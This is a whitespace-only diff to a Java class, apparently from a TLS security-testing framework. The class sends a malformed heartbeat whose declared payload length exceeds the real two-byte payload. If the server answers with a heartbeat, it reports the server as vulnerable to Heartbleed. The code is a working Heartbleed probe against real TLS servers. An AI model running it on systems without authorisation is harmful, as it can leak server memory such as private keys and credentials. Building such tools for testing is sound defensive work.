@@ -40,40 +40,42 @@ public class HeartbleedAttack extends Attacker<HeartbleedCommandConfig> {
     private static final Logger LOGGER = LogManager.getLogger(HeartbleedAttack.class);
 
     public HeartbleedAttack(HeartbleedCommandConfig config) {
-	super(config);
+        super(config);
     }
 
     @Override
     public void executeAttack(ConfigHandler configHandler) {
-	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
-	TlsContext tlsContext = configHandler.initializeTlsContext(config);
-	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
+        TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
+        TlsContext tlsContext = configHandler.initializeTlsContext(config);
+        WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
 
-	WorkflowTrace trace = tlsContext.getWorkflowTrace();
+        WorkflowTrace trace = tlsContext.getWorkflowTrace();
 
-	ModifiableByte heartbeatMessageType = new ModifiableByte();
-	ModifiableInteger payloadLength = new ModifiableInteger();
-	payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
-	ModifiableByteArray payload = new ModifiableByteArray();
-	payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
-	HeartbeatMessage hb = (HeartbeatMessage) trace.getFirstConfiguredSendMessageOfType(ProtocolMessageType.HEARTBEAT);
-	hb.setHeartbeatMessageType(heartbeatMessageType);
-	hb.setPayload(payload);
-	hb.setPayloadLength(payloadLength);
+        ModifiableByte heartbeatMessageType = new ModifiableByte();
+        ModifiableInteger payloadLength = new ModifiableInteger();
+        payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
+        ModifiableByteArray payload = new ModifiableByteArray();
+        payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
+        HeartbeatMessage hb = (HeartbeatMessage) trace
+                .getFirstConfiguredSendMessageOfType(ProtocolMessageType.HEARTBEAT);
+        hb.setHeartbeatMessageType(heartbeatMessageType);
+        hb.setPayload(payload);
+        hb.setPayloadLength(payloadLength);
 
-	try {
-	    workflowExecutor.executeWorkflow();
-	} catch (WorkflowExecutionException ex) {
-	    LOGGER.info(
-		    "The TLS protocol flow was not executed completely, follow the debug messages for more information.",
-		    ex);
-	}
+        try {
+            workflowExecutor.executeWorkflow();
+        } catch (WorkflowExecutionException ex) {
+            LOGGER.info(
+                    "The TLS protocol flow was not executed completely, follow the debug messages for more information.",
+                    ex);
+        }
 
-	if (trace.getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.FINISHED).isEmpty()) {
+        if (trace.getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.FINISHED).isEmpty()) {
             LOGGER.log(LogLevel.CONSOLE_OUTPUT,
                     "Correct TLS handshake cannot be executed, no Server Finished message found. Check the server configuration.");
         } else {
-            ProtocolMessage lastMessage = trace.getAllActuallyReceivedMessages().get(trace.getAllActuallyReceivedMessages().size()-1);
+            ProtocolMessage lastMessage = trace.getAllActuallyReceivedMessages().get(
+                    trace.getAllActuallyReceivedMessages().size() - 1);
             if (lastMessage.getProtocolMessageType() == ProtocolMessageType.HEARTBEAT) {
                 LOGGER.log(LogLevel.CONSOLE_OUTPUT,
                         "Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid ");
@@ -85,8 +87,8 @@ public class HeartbleedAttack extends Attacker<HeartbleedCommandConfig> {
             }
         }
 
-	tlsContexts.add(tlsContext);
+        tlsContexts.add(tlsContext);
 
-	transportHandler.closeConnection();
+        transportHandler.closeConnection();
     }
 }
